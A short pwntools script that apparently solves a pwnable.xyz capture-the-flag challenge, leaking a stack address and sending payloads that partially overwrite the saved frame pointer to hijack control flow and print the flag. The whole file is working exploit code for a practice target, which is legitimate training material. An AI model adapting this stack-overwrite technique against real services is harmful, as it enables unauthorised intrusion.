from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30012)
# gdb.attach(p)

p.sendlineafter('>', '3')
stack_leak = int(p.recvuntil('\n')[1:-1], 16)

canary_stack = stack_leak - 0x108
jump_addr_stack = canary_stack + 0x8
rbp = jump_addr_stack + 0x11

p.sendlineafter('>', '123ABBBBCCCCDDDDEEEEFFFFGGGGHHHH' + p8(rbp&0xff))
rbp = canary_stack + 0x10
p.sendlineafter('>', '123')
p.sendlineafter('>', '1AAABBBBCCCCDDDDEEEEFFFFGGGGHHHH' + p8(rbp&0xff))
print p.recvuntil('}')

